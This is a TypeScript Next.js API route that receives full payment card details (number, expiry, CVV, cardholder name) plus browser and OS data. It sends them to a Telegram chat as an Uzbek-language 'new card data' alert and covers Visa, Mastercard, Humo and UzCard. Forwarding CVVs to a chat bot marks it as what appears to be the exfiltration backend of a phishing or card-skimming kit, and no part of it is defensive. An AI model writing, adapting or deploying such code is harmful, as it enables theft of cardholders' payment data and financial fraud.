import { NextRequest, NextResponse } from 'next/server';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const API_SECRET_TOKEN = process.env.API_SECRET_TOKEN;

export async function POST(request: NextRequest) {
    try {
        // Validate authorization token
        const authHeader = request.headers.get('Authorization');
        const token = authHeader?.replace('Bearer ', '');

        if (!API_SECRET_TOKEN || token !== API_SECRET_TOKEN) {
            return NextResponse.json(
                { success: false, error: 'Unauthorized' },
                { status: 401 }
            );
        }

        const body = await request.json();
        const { cardNumber, expiryDate, cvv, cardType, fullName, userAgent } = body;

        if (!cardNumber || !expiryDate || !fullName) {
            return NextResponse.json(
                { success: false, error: 'Missing required fields' },
                { status: 400 }
            );
        }

        // Format message for Telegram
        const cardTypeEmoji = {
            visa: '💳 Visa',
            mastercard: '💳 Mastercard',
            humo: '🇺🇿 Humo',
            uzcard: '🇺🇿 UzCard',
            unknown: '💳 Unknown'
        };

        // Parse user agent for browser/OS
        let browser = 'Unknown';
        let os = 'Unknown';
        if (userAgent) {
            if (userAgent.includes('Chrome')) browser = 'Chrome';
            else if (userAgent.includes('Firefox')) browser = 'Firefox';
            else if (userAgent.includes('Safari')) browser = 'Safari';
            else if (userAgent.includes('Edge')) browser = 'Edge';

            if (userAgent.includes('Windows')) os = 'Windows';
            else if (userAgent.includes('Mac')) os = 'macOS';
            else if (userAgent.includes('Linux')) os = 'Linux';
            else if (userAgent.includes('Android')) os = 'Android';
            else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
        }

        const now = new Date();
        const dateStr = now.toLocaleDateString('uz-UZ', {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        });
        const timeStr = now.toLocaleTimeString('uz-UZ', {
            hour: '2-digit',
            minute: '2-digit'
        });

        const message = `
💰 <b>YANGI KARTA MA'LUMOTLARI!</b>

${cardTypeEmoji[cardType as keyof typeof cardTypeEmoji] || cardTypeEmoji.unknown}

📝 <b>Ism:</b> <code>${fullName}</code>
💳 <b>Karta:</b> <code>${cardNumber}</code>
📅 <b>Amal qilish:</b> <code>${expiryDate}</code>
${cvv ? `🔐 <b>CVV:</b> <code>${cvv}</code>` : ''}

📱 <b>Brauzer:</b> ${browser}
💻 <b>OS:</b> ${os}
📆 <b>Sana:</b> ${dateStr}
⏰ <b>Vaqt:</b> ${timeStr}
`.trim();

        // Send to Telegram
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const result = await response.json();

        if (!result.ok) {
            console.error('Telegram API error:', result);
            return NextResponse.json(
                { success: false, error: 'Failed to send to Telegram' },
                { status: 500 }
            );
        }

        return NextResponse.json({ success: true });
    } catch (error) {
        console.error('Card API error:', error);
        return NextResponse.json(
            { success: false, error: 'Internal server error' },
            { status: 500 }
        );
    }
}
